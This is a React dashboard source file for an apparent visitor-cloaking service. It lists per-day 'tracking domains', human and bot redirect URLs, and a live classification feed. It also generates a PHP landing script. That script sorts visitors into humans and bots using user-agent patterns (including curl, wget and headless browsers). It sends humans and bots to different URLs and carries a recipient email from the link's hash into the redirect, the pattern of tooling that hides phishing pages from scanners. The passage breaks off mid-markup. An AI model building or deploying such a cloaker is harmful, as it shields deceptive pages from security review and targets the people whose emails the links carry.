import { useQuery, useMutation } from "@tanstack/react-query";
import { userAuthApi } from "@/lib/user-auth";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Separator } from "@/components/ui/separator";
import { Badge } from "@/components/ui/badge";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Switch } from "@/components/ui/switch";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { 
  LogOut, Save, ExternalLink, BarChart3, Shield, Link as LinkIcon, Key, Lock, User, 
  Activity, Code, Download, Copy, AlertTriangle, TrendingUp, Globe, Users, Bot,
  Play, Pause, Settings, FileText, CheckCircle2, XCircle, Info, Check, Zap,
  CreditCard, Clock, Radio, Trash2
} from "lucide-react";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import JSZip from 'jszip';
import { format, formatDistanceToNow } from 'date-fns';
import { useSecurityEvents } from "@/hooks/use-security-events";

interface AvailableDomain {
  id: string;
  domain: string;
  description: string | null;
}

interface GeneratedDomain {
  id: string;
  domain: string;
  generatedAt: string;
}

// ---- Live Security Events Feed ----
function LiveEventsFeed() {
  const { events, connected, clear } = useSecurityEvents();

  return (
    <Card className="shadow-md border-2">
      <CardHeader className="bg-gradient-to-r from-primary/5 to-primary/0">
        <div className="flex items-center justify-between">
          <div>
            <CardTitle className="flex items-center gap-2">
              <Radio className="h-5 w-5 text-primary" />
              Live Security Events
            </CardTitle>
            <CardDescription>
              Real-time stream of visitor classifications for your API key
            </CardDescription>
          </div>
          <div className="flex items-center gap-3">
            {/* Connection status indicator */}
            <div className="flex items-center gap-1.5">
              <span
                className={`h-2.5 w-2.5 rounded-full ${
                  connected
                    ? "bg-green-500 animate-pulse"
                    : "bg-zinc-400"
                }`}
                aria-label={connected ? "Connected" : "Disconnected"}
              />
              <span className="text-xs text-muted-foreground">
                {connected ? "Live" : "Connecting…"}
              </span>
            </div>
            {events.length > 0 && (
              <Button
                variant="ghost"
                size="sm"
                onClick={clear}
                className="h-8 px-2 text-muted-foreground hover:text-foreground"
                title="Clear feed"
              >
                <Trash2 className="h-3.5 w-3.5" />
              </Button>
            )}
          </div>
        </div>
      </CardHeader>
      <CardContent className="p-0">
        {events.length === 0 ? (
          <div className="text-center py-16 text-muted-foreground">
            <Radio className="h-10 w-10 mx-auto mb-3 opacity-20" />
            <p className="font-medium">Waiting for events…</p>
            <p className="text-sm mt-1 max-w-xs mx-auto">
              New visitor classifications will appear here instantly, without
              requiring a page refresh.
            </p>
          </div>
        ) : (
          <div className="overflow-x-auto max-h-[520px] overflow-y-auto">
            <Table>
              <TableHeader className="sticky top-0 bg-background z-10 border-b">
                <TableRow>
                  <TableHead className="w-[110px]">Time</TableHead>
                  <TableHead className="w-[90px]">Type</TableHead>
                  <TableHead>IP Address</TableHead>
                  <TableHead>Detection</TableHead>
                  <TableHead>Country</TableHead>
                  <TableHead>ISP</TableHead>
                  <TableHead className="w-[90px]">Action</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {events.map((evt) => (
                  <TableRow
                    key={evt.id}
                    data-testid="live-event-row"
                    className={
                      evt.isNew
                        ? "bg-primary/8 transition-colors duration-700"
                        : "transition-colors duration-700"
                    }
                    style={evt.isNew ? { backgroundColor: "hsl(var(--primary) / 0.08)" } : {}}
                  >
                    <TableCell className="font-mono text-xs tabular-nums whitespace-nowrap">
                      {formatDistanceToNow(new Date(evt.timestamp), { addSuffix: true })}
                    </TableCell>
                    <TableCell>
                      {evt.visitorType === "Human" ? (
                        <Badge className="bg-green-600 text-white gap-1 text-xs">
                          <Users className="h-3 w-3" />
                          Human
                        </Badge>
                      ) : (
                        <Badge className="bg-red-600 text-white gap-1 text-xs">
                          <Bot className="h-3 w-3" />
                          Bot
                        </Badge>
                      )}
                    </TableCell>
                    <TableCell className="font-mono text-xs">{evt.ipAddress}</TableCell>
                    <TableCell className="text-xs text-muted-foreground">
                      {evt.detectionMethod}
                    </TableCell>
                    <TableCell className="text-xs">{evt.country}</TableCell>
                    <TableCell className="text-xs max-w-[150px] truncate" title={evt.isp}>
                      {evt.isp}
                    </TableCell>
                    <TableCell>
                      <Badge
                        variant="outline"
                        className={`text-xs ${
                          evt.action === "Allowed"
                            ? "border-green-500 text-green-700 dark:text-green-400"
                            : "border-red-500 text-red-700 dark:text-red-400"
                        }`}
                      >
                        {evt.action}
                      </Badge>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>
        )}
        {events.length > 0 && (
          <div className="px-4 py-2 border-t text-xs text-muted-foreground text-right">
            {events.length} event{events.length !== 1 ? "s" : ""} (last {events.length >= 100 ? "100" : events.length})
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// ---- Billing Status Card ----
function BillingStatusCard() {
  const { toast } = useToast();

  const { data: billing, isLoading } = useQuery<{
    subscriptionStatus: string;
    trialEndsAt: string | null;
    trialDaysRemaining: number | null;
    isActive: boolean;
  }>({
    queryKey: ["/api/user/billing"],
    refetchInterval: 60000,
  });

  const checkoutMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch("/api/billing/create-checkout-session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
      });
      if (!response.ok) throw new Error("Failed to create checkout session");
      return response.json();
    },
    onSuccess: (data) => {
      if (data.url) window.location.href = data.url;
    },
    onError: (error: Error) => {
      toast({
        title: "Upgrade Failed",
        description: error.message || "Could not start checkout. Please try again.",
        variant: "destructive",
      });
    },
  });

  if (isLoading) return null;
  if (!billing) return null;

  const statusConfig: Record<string, { label: string; color: string; icon: React.ReactNode }> = {
    trialing: {
      label: `Trial — ${billing.trialDaysRemaining ?? 0} day${billing.trialDaysRemaining !== 1 ? "s" : ""} left`,
      color: "text-blue-700 dark:text-blue-300 bg-blue-50 dark:bg-blue-950 border-blue-200 dark:border-blue-800",
      icon: <Clock className="h-4 w-4 text-blue-600" />,
    },
    active: {
      label: "Subscribed",
      color: "text-green-700 dark:text-green-300 bg-green-50 dark:bg-green-950 border-green-200 dark:border-green-800",
      icon: <CheckCircle2 className="h-4 w-4 text-green-600" />,
    },
    past_due: {
      label: "Payment Past Due",
      color: "text-orange-700 dark:text-orange-300 bg-orange-50 dark:bg-orange-950 border-orange-200 dark:border-orange-800",
      icon: <AlertTriangle className="h-4 w-4 text-orange-600" />,
    },
    cancelled: {
      label: "Cancelled",
      color: "text-red-700 dark:text-red-300 bg-red-50 dark:bg-red-950 border-red-200 dark:border-red-800",
      icon: <XCircle className="h-4 w-4 text-red-600" />,
    },
  };

  const cfg = statusConfig[billing.subscriptionStatus] ?? statusConfig.cancelled;
  const showUpgrade = billing.subscriptionStatus !== "active";
  const isExpiredTrial =
    billing.subscriptionStatus === "trialing" && (billing.trialDaysRemaining ?? 0) <= 0;

  return (
    <Card className={`border-2 shadow-md ${isExpiredTrial ? "border-red-300 dark:border-red-700" : ""}`}>
      <CardHeader className="pb-3">
        <CardTitle className="flex items-center gap-2 text-base">
          <CreditCard className="h-5 w-5 text-primary" />
          Subscription
        </CardTitle>
      </CardHeader>
      <CardContent>
        <div className={`flex items-center justify-between p-3 rounded-lg border ${cfg.color}`}>
          <div className="flex items-center gap-2">
            {cfg.icon}
            <span className="font-medium text-sm">{cfg.label}</span>
          </div>
          {showUpgrade && (
            <Button
              size="sm"
              onClick={() => checkoutMutation.mutate()}
              disabled={checkoutMutation.isPending}
              data-testid="button-upgrade"
            >
              {checkoutMutation.isPending ? "Redirecting…" : "Upgrade"}
            </Button>
          )}
        </div>
        {isExpiredTrial && (
          <p className="text-sm text-red-600 dark:text-red-400 mt-2">
            Your trial has expired. Classification calls are redirecting all traffic to your bot URL
            until you upgrade.
          </p>
        )}
        {billing.subscriptionStatus === "past_due" && (
          <p className="text-sm text-orange-600 dark:text-orange-400 mt-2">
            Your last payment failed. Please update your payment method to restore access.
          </p>
        )}
      </CardContent>
    </Card>
  );
}

function DomainBrowserSection() {
  const { toast } = useToast();
  const [testingDomain, setTestingDomain] = useState<string | null>(null);
  const [testResult, setTestResult] = useState<{ domain: string; reachable: boolean } | null>(null);
  const [generatingDomainId, setGeneratingDomainId] = useState<string | null>(null);

  const { data: availableDomains = [], isLoading: domainsLoading } = useQuery<AvailableDomain[]>({
    queryKey: ["/api/user/domains"],
  });

  const { data: generatedDomains = [] } = useQuery<GeneratedDomain[]>({
    queryKey: ["/api/user/domains/generated"],
  });

  const { data: remainingData } = useQuery<{ remaining: number; limit: number }>({
    queryKey: ["/api/user/domains/remaining"],
  });

  const generateMutation = useMutation({
    mutationFn: async (domainId: string) => {
      setGeneratingDomainId(domainId);
      const response = await apiRequest("POST", "/api/user/domains/generate", { domainId });
      return response.json();
    },
    onSuccess: (data) => {
      queryClient.invalidateQueries({ queryKey: ["/api/user/domains/generated"] });
      queryClient.invalidateQueries({ queryKey: ["/api/user/domains/remaining"] });
      toast({
        title: "Domain Generated",
        description: `Tracking link for ${data.domain} has been created`,
      });
      setGeneratingDomainId(null);
    },
    onError: (error: Error) => {
      toast({
        title: "Generation Failed",
        description: error.message || "Failed to generate domain link",
        variant: "destructive",
      });
      setGeneratingDomainId(null);
    },
  });

  const testDomainMutation = useMutation({
    mutationFn: async (domain: string) => {
      setTestingDomain(domain);
      setTestResult(null);
      const response = await apiRequest("POST", "/api/user/domains/test", { domain });
      return response.json();
    },
    onSuccess: (data) => {
      setTestResult({ domain: data.domain, reachable: data.reachable });
      setTestingDomain(null);
    },
    onError: (error: Error) => {
      setTestResult({ domain: testingDomain || '', reachable: false });
      setTestingDomain(null);
    },
  });

  const copyDomain = (domain: string) => {
    navigator.clipboard.writeText(domain);
    toast({
      title: "Copied",
      description: `${domain} copied to clipboard`,
    });
  };

  const isAlreadyGenerated = (domainId: string) => {
    return generatedDomains.some(g => g.domain === availableDomains.find(d => d.id === domainId)?.domain);
  };

  return (
    <div className="space-y-6">
      <Card className="shadow-md border-2">
        <CardHeader className="bg-gradient-to-r from-primary/5 to-primary/0">
          <CardTitle className="flex items-center gap-2">
            <Globe className="h-5 w-5 text-primary" />
            Available Domains
          </CardTitle>
          <CardDescription>
            Browse available tracking domains. You can generate up to {remainingData?.limit || 3} domains per day.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <Alert data-testid="alert-domain-info">
            <Info className="h-4 w-4" />
            <AlertDescription>
              You have <strong>{remainingData?.remaining ?? '...'}</strong> of <strong>{remainingData?.limit || 3}</strong> generations remaining today. 
              Use the Test button to verify a domain is reachable before generating.
            </AlertDescription>
          </Alert>

          {domainsLoading ? (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mx-auto"></div>
              <p className="mt-3 text-muted-foreground">Loading domains...</p>
            </div>
          ) : availableDomains.length === 0 ? (
            <div className="text-center py-12 text-muted-foreground">
              <Globe className="h-12 w-12 mx-auto mb-3 opacity-30" />
              <p className="font-medium">No domains available</p>
              <p className="text-sm mt-1">Check back later for available tracking domains</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Domain</TableHead>
                    <TableHead>Description</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead className="text-right">Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {availableDomains.map((domain) => {
                    const alreadyGenerated = isAlreadyGenerated(domain.id);
                    return (
                      <TableRow key={domain.id} data-testid={`domain-row-${domain.id}`}>
                        <TableCell className="font-mono text-sm font-medium">
                          {domain.domain}
                        </TableCell>
                        <TableCell className="text-sm text-muted-foreground">
                          {domain.description || '-'}
                        </TableCell>
                        <TableCell>
                          {testResult?.domain === domain.domain ? (
                            <Badge variant={testResult.reachable ? "default" : "destructive"} className="gap-1">
                              {testResult.reachable ? (
                                <><Check className="h-3 w-3" /> Reachable</>
                              ) : (
                                <><XCircle className="h-3 w-3" /> Unreachable</>
                              )}
                            </Badge>
                          ) : alreadyGenerated ? (
                            <Badge variant="secondary" className="gap-1">
                              <Check className="h-3 w-3" /> Generated
                            </Badge>
                          ) : (
                            <Badge variant="outline">Available</Badge>
                          )}
                        </TableCell>
                        <TableCell className="text-right">
                          <div className="flex items-center justify-end gap-2">
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => testDomainMutation.mutate(domain.domain)}
                              disabled={testingDomain === domain.domain}
                              data-testid={`button-test-${domain.id}`}
                            >
                              {testingDomain === domain.domain ? (
                                <span className="animate-pulse">Testing...</span>
                              ) : (
                                <>
                                  <ExternalLink className="h-3 w-3 mr-1" />
                                  Test
                                </>
                              )}
                            </Button>
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => copyDomain(domain.domain)}
                              data-testid={`button-copy-${domain.id}`}
                            >
                              <Copy className="h-3 w-3" />
                            </Button>
                            <Button
                              size="sm"
                              onClick={() => generateMutation.mutate(domain.id)}
                              disabled={alreadyGenerated || generatingDomainId === domain.id || (remainingData?.remaining ?? 0) <= 0}
                              data-testid={`button-generate-${domain.id}`}
                            >
                              {generatingDomainId === domain.id ? (
                                <span className="animate-pulse">Generating...</span>
                              ) : alreadyGenerated ? (
                                <>
                                  <Check className="h-3 w-3 mr-1" />
                                  Generated
                                </>
                              ) : (
                                <>
                                  <Zap className="h-3 w-3 mr-1" />
                                  Generate
                                </>
                              )}
                            </Button>
                          </div>
                        </TableCell>
                      </TableRow>
                    );
                  })}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>

      <Card className="shadow-md">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Zap className="h-5 w-5 text-primary" />
            Your Generated Domains
          </CardTitle>
          <CardDescription>Domains you've generated for your tracking links</CardDescription>
        </CardHeader>
        <CardContent>
          {generatedDomains.length === 0 ? (
            <div className="text-center py-8 text-muted-foreground">
              <Zap className="h-8 w-8 mx-auto mb-2 opacity-30" />
              <p>No domains generated yet</p>
              <p className="text-sm mt-1">Generate domains from the list above</p>
            </div>
          ) : (
            <div className="space-y-2">
              {generatedDomains.map((gen) => (
                <div 
                  key={gen.id} 
                  className="flex items-center justify-between p-3 bg-muted/30 rounded-lg border"
                  data-testid={`generated-domain-${gen.id}`}
                >
                  <div>
                    <p className="font-mono font-medium">{gen.domain}</p>
                    <p className="text-xs text-muted-foreground">
                      Generated {format(new Date(gen.generatedAt), 'MMM d, yyyy HH:mm')}
                    </p>
                  </div>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => copyDomain(gen.domain)}
                    data-testid={`button-copy-generated-${gen.id}`}
                  >
                    <Copy className="h-3 w-3 mr-1" />
                    Copy
                  </Button>
                </div>
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}

export default function UserDashboard() {
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [humanUrl, setHumanUrl] = useState("");
  const [botUrl, setBotUrl] = useState("");
  const [isPasswordDialogOpen, setIsPasswordDialogOpen] = useState(false);
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");

  const { data: user, isLoading: userLoading } = useQuery({
    queryKey: ["/api/user/me"],
    queryFn: userAuthApi.getCurrentUser,
  });

  const { data: stats } = useQuery<{
    totalClassifications: number;
    humanVisitors: number;
    botTraffic: number;
  }>({
    queryKey: ["/api/user/stats"],
    refetchInterval: 30000,
  });

  const { data: redirectUrls, isLoading: urlsLoading } = useQuery<{
    humanUrl: string;
    botUrl: string;
  }>({
    queryKey: ["/api/user/redirect-urls"],
    refetchOnMount: true,
  });

  const { data: classifications = [] } = useQuery<any[]>({
    queryKey: ["/api/user/classifications"],
    refetchInterval: 10000,
  });

  const { data: apiKeyDetails } = useQuery<any>({
    queryKey: ["/api/user/api-key-details"],
    refetchInterval: 30000,
  });

  const { data: apiKeyValue } = useQuery<{ keyValue: string | null }>({
    queryKey: ["/api/user/api-key-value"],
  });

  const { data: whitelabelData } = useQuery<{ domain: string }>({
    queryKey: ["/api/whitelabel-domain"],
  });

  useEffect(() => {
    if (redirectUrls) {
      setHumanUrl(redirectUrls.humanUrl || "");
      setBotUrl(redirectUrls.botUrl || "");
    }
  }, [redirectUrls]);

  const updateUrlsMutation = useMutation({
    mutationFn: async (urls: { humanUrl: string; botUrl: string }) => {
      const response = await apiRequest("PUT", "/api/user/redirect-urls", urls);
      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "URLs Updated",
        description: "Your redirect URLs have been saved successfully.",
      });
      queryClient.invalidateQueries({ queryKey: ["/api/user/redirect-urls"] });
    },
    onError: (error: Error) => {
      toast({
        title: "Update Failed",
        description: error.message || "Failed to update redirect URLs",
        variant: "destructive",
      });
    },
  });

  const changePasswordMutation = useMutation({
    mutationFn: async (data: { currentPassword: string; newPassword: string }) => {
      const response = await apiRequest("POST", "/api/user/change-password", data);
      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "Password Changed",
        description: "Your password has been updated successfully.",
      });
      setIsPasswordDialogOpen(false);
      setCurrentPassword("");
      setNewPassword("");
      setConfirmPassword("");
    },
    onError: (error: Error) => {
      toast({
        title: "Change Failed",
        description: error.message || "Failed to change password",
        variant: "destructive",
      });
    },
  });

  const toggleLicenseMutation = useMutation({
    mutationFn: async (pause: boolean) => {
      const endpoint = pause ? `/api/api-keys/${apiKeyDetails?.id}/pause` : `/api/api-keys/${apiKeyDetails?.id}/resume`;
      const response = await apiRequest("POST", endpoint, {});
      return response.json();
    },
    onSuccess: (_, pause) => {
      toast({
        title: pause ? "License Paused" : "License Activated",
        description: pause ? "All visitors will now be redirected to bot URL" : "Normal classification resumed",
      });
      queryClient.invalidateQueries({ queryKey: ["/api/user/api-key-details"] });
    },
    onError: (error: Error) => {
      toast({
        title: "Operation Failed",
        description: error.message || "Failed to update license status",
        variant: "destructive",
      });
    },
  });

  const logoutMutation = useMutation({
    mutationFn: userAuthApi.logout,
    onSuccess: () => {
      queryClient.clear();
      navigate("/");
    },
  });

  const handleSaveUrls = () => {
    if (!humanUrl || !botUrl) {
      toast({
        title: "Missing URLs",
        description: "Please enter both human and bot redirect URLs",
        variant: "destructive",
      });
      return;
    }
    updateUrlsMutation.mutate({ humanUrl, botUrl });
  };

  const handleChangePassword = () => {
    if (!currentPassword || !newPassword || !confirmPassword) {
      toast({
        title: "Missing Information",
        description: "Please fill in all password fields",
        variant: "destructive",
      });
      return;
    }

    if (newPassword !== confirmPassword) {
      toast({
        title: "Passwords Don't Match",
        description: "New password and confirmation must match",
        variant: "destructive",
      });
      return;
    }

    if (newPassword.length < 8) {
      toast({
        title: "Password Too Short",
        description: "Password must be at least 8 characters",
        variant: "destructive",
      });
      return;
    }

    changePasswordMutation.mutate({ currentPassword, newPassword });
  };

  const handleToggleLicense = () => {
    const isPaused = apiKeyDetails?.status === 'paused';
    toggleLicenseMutation.mutate(!isPaused);
  };

  const handleDownloadScript = async () => {
    if (!apiKeyValue?.keyValue) {
      toast({
        title: "Missing API Key",
        description: "No API key available for download",
        variant: "destructive",
      });
      return;
    }

    const apiKey = apiKeyValue.keyValue;
    
    // Handle domain - if it already starts with http/https, use as-is
    // Otherwise, add the https://api. prefix
    let apiEndpoint = window.location.origin;
    if (whitelabelData?.domain) {
      const domain = whitelabelData.domain;
      if (domain.startsWith('http://') || domain.startsWith('https://')) {
        apiEndpoint = domain;
      } else {
        apiEndpoint = `https://api.${domain}`;
      }
    }

    const phpContent = `<?php
session_start();

$apiKey = '${apiKey}';
$apiEndpoint = '${apiEndpoint}/api/classify';
$cacheDuration = 600;

$visitorIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$visitorUserAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$visitorFingerprint = md5($visitorIp . $visitorUserAgent);

function isKnownBot($userAgent) {
    if (empty($userAgent) || strlen($userAgent) < 10) {
        return true;
    }
    
    $botPatterns = [
        'bot', 'crawl', 'spider', 'scrape',
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot',
        'facebookexternalhit', 'Twitterbot', 'LinkedInBot', 'WhatsApp', 'TelegramBot',
        'curl', 'wget', 'python-requests', 'Go-http-client', 'Java/', 'Apache-HttpClient',
        'HeadlessChrome', 'PhantomJS', 'Puppeteer', 'Selenium', 'WebDriver'
    ];
    
    foreach ($botPatterns as $pattern) {
        if (stripos($userAgent, $pattern) !== false) {
            return true;
        }
    }
    
    return false;
}

if (isKnownBot($visitorUserAgent) && isset($_SESSION['ct_bot_url'], $_SESSION['ct_bot_version'], $_SESSION['ct_bot_checked_at'])) {
    $latestVersion = $_SESSION['ct_latest_version'] ?? 0;
    $botCachedVersion = $_SESSION['ct_bot_version'];
    $botCheckedAt = $_SESSION['ct_bot_checked_at'];
    $botCacheAge = time() - $botCheckedAt;
    
    if ($latestVersion > $botCachedVersion || $botCacheAge >= 60) {
        unset($_SESSION['ct_bot_url']);
        unset($_SESSION['ct_bot_version']);
        unset($_SESSION['ct_bot_checked_at']);
    } else {
        $botUrl = rtrim($_SESSION['ct_bot_url'], '#');
        if (!empty($_SERVER['QUERY_STRING'])) {
            $separator = (strpos($botUrl, '?') !== false) ? '&' : '?';
            $botUrl .= $separator . $_SERVER['QUERY_STRING'];
        }
        
        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        header('Pragma: no-cache');
        header('Expires: 0');
        header('Location: ' . $botUrl);
        exit;
    }
}

$clientBrowser = $_POST['browser'] ?? null;
$clientDevice = $_POST['device'] ?? null;

if (!$clientBrowser || !$clientDevice) {
    ?><!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Loading...</title>
<style>body{margin:0;background:#fff}</style>
</head><body>
<form id="dataForm" method="POST" action="<?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?>" style="display:none;">
    <input type="hidden" name="browser" id="browserInput">
    <input type="hidden" name="device" id="deviceInput">
</form>
<script>
(function(){
    var hash=window.location.hash;
    if(hash&&hash.indexOf('e=')>-1&&(!window.location.search||window.location.search.indexOf('e=')===-1)){
        var pairs=hash.substring(1).split('&');
        for(var i=0;i<pairs.length;i++){
            var kv=pairs[i].split('=');
            if(kv[0]==='e'||kv[0]==='email'){
                var emailPart=kv.slice(1).join('=');
                var email=decodeURIComponent(emailPart);
                var sep=window.location.search?'&':'?';
                window.location.replace(window.location.pathname+window.location.search+sep+'e='+encodeURIComponent(email));
                return;
            }
        }
    }
    function detectBrowser(){var ua=navigator.userAgent;if(ua.indexOf('Firefox')>-1)return 'Firefox';if(ua.indexOf('Edg')>-1)return 'Edge';if(ua.indexOf('Chrome')>-1)return 'Chrome';if(ua.indexOf('Safari')>-1)return 'Safari';if(ua.indexOf('Trident')>-1||ua.indexOf('MSIE')>-1)return 'IE';return 'Unknown'}
    function detectDevice(){var ua=navigator.userAgent;if(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua))return 'Tablet';if(/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua))return 'Mobile';return 'Desktop'}
    document.getElementById('browserInput').value=detectBrowser();
    document.getElementById('deviceInput').value=detectDevice();
    document.getElementById('dataForm').submit();
})();
</script></body></html><?php
    exit;
}

$email = null;
if (!empty($_SERVER['QUERY_STRING'])) {
    parse_str($_SERVER['QUERY_STRING'], $queryParams);
    $email = $queryParams['e'] ?? $queryParams['email'] ?? null;
}

$requestData = [
    'ip' => $visitorIp,
    'userAgent' => $visitorUserAgent
];

if ($clientBrowser) {
    $requestData['browser'] = $clientBrowser;
}
if ($clientDevice) {
    $requestData['deviceType'] = $clientDevice;
}
if ($email) {
    $requestData['email'] = $email;
}

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $apiEndpoint,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($requestData),
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
        'X-API-Key: ' . $apiKey
    ],
    CURLOPT_TIMEOUT => 10,
    CURLOPT_SSL_VERIFYPEER => true
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$redirectUrl = null;
$visitorType = 'Bot';
$redirectVersion = 0;

if ($httpCode === 200 && $response) {
    $data = json_decode($response, true);
    if ($data && isset($data['visitorType'], $data['redirectUrl'])) {
        $visitorType = $data['visitorType'];
        $redirectUrl = $data['redirectUrl'];
        $redirectVersion = $data['redirectVersion'] ?? 0;
        
        $_SESSION['ct_latest_version'] = max($_SESSION['ct_latest_version'] ?? 0, $redirectVersion);
        
        if ($visitorType === 'Bot') {
            $_SESSION['ct_bot_url'] = $redirectUrl;
            $_SESSION['ct_bot_version'] = $redirectVersion;
            $_SESSION['ct_bot_checked_at'] = time();
        }
        
        if (isset($_SESSION['ct_' . $visitorFingerprint])) {
            $cachedVersion = $_SESSION['ct_' . $visitorFingerprint]['redirectVersion'] ?? 0;
            if ($redirectVersion > $cachedVersion && $redirectVersion > 0) {
                unset($_SESSION['ct_' . $visitorFingerprint]);
            }
        }
    }
}

if ($redirectUrl) {
    $_SESSION['ct_' . $visitorFingerprint] = [
        'redirectUrl' => $redirectUrl,
        'visitorType' => $visitorType,
        'redirectVersion' => $redirectVersion,
        'timestamp' => time()
    ];
    
    $redirectUrl = rtrim($redirectUrl, '#');
    
    if (!empty($_SERVER['QUERY_STRING'])) {
        $separator = (strpos($redirectUrl, '?') !== false) ? '&' : '?';
        $redirectUrl .= $separator . $_SERVER['QUERY_STRING'];
    }
    
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Expires: 0');
    header('Location: ' . $redirectUrl);
    exit;
}

http_response_code(503);
die('Service temporarily unavailable. Please try again later.');
?>`;

    try {
      const zip = new JSZip();
      
      const randomName = Array.from(crypto.getRandomValues(new Uint8Array(14)))
        .map(b => b.toString(36))
        .join('');
      
      zip.file("index.php", phpContent);
      
      const blob = await zip.generateAsync({ type: "blob" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `${randomName}.zip`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      toast({
        title: "Script Downloaded",
        description: "PHP script package downloaded successfully",
      });
    } catch (error) {
      toast({
        title: "Download Failed",
        description: "Failed to generate script package",
        variant: "destructive",
      });
    }
  };

  if (userLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mx-auto"></div>
          <p className="mt-4 text-muted-foreground">Loading dashboard...</p>
        </div>
      </div>
    );
  }

  const isLicenseActive = apiKeyDetails?.status === 'active';
  const isLicensePaused = apiKeyDetails?.status === 'paused';
  const isLicenseExpired = apiKeyDetails?.status === 'expired';

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
      <div className="border-b border-border bg-card/50 backdrop-blur-sm sticky top-0 z-10">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <Shield className="h-8 w-8 text-primary" />
              <div>
                <p className="text-sm text-muted-foreground">{user?.username}</p>
              </div>
            </div>
            <Button 
              variant="outline" 
              onClick={() => logoutMutation.mutate()}
              data-testid="button-logout"
              className="gap-2"
            >
              <LogOut className="h-4 w-4" />
              Logout
            </Button>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <Tabs defaultValue="analytics" className="space-y-6">
          <TabsList className="grid w-full grid-cols-3 md:grid-cols-6 lg:w-auto lg:inline-grid">
            <TabsTrigger value="analytics" className="gap-2" data-testid="tab-analytics">
              <BarChart3 className="h-4 w-4" />
              License & Analytics
            </TabsTrigger>
            <TabsTrigger value="live" className="gap-2" data-testid="tab-live">
              <Radio className="h-4 w-4" />
              Live Events
            </TabsTrigger>
            <TabsTrigger value="domains" className="gap-2" data-testid="tab-domains">
              <Globe className="h-4 w-4" />
              Domains
            </TabsTrigger>
            <TabsTrigger value="logs" className="gap-2" data-testid="tab-logs">
              <Activity className="h-4 w-4" />
              Classification Logs
            </TabsTrigger>
            <TabsTrigger value="settings" className="gap-2" data-testid="tab-settings">
              <Settings className="h-4 w-4" />
              Settings
            </TabsTrigger>
            <TabsTrigger value="legal" className="gap-2" data-testid="tab-legal">
              <Shield className="h-4 w-4" />
              Legal & Privacy
            </TabsTrigger>
          </TabsList>

          <TabsContent value="analytics" className="space-y-6">
            <BillingStatusCard />
            <Card className="border-2 border-primary/20 shadow-lg">
              <CardHeader className="bg-gradient-to-r from-primary/10 to-primary/5">
                <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                  <div className="flex-1">
                    <CardTitle className="text-xl flex items-center gap-2">
                      <Key className="h-5 w-5 text-primary" />
                      API License Status
                    </CardTitle>
                    <CardDescription className="mt-2 text-sm max-w-2xl">
                      <strong>Pause/Resume Control:</strong> Temporarily pause your license during testing, maintenance, or when idle. 
                      Paused licenses redirect <strong>all visitors</strong> to your bot URL. This <strong>does not affect your expiration date</strong> - 
                      your license time continues regardless of pause status.
                    </CardDescription>
                  </div>
                  <div className="flex items-center space-x-4">
                    <div className="text-right">
                      <p className="text-xs text-muted-foreground mb-1.5">Current Status</p>
                      <Badge 
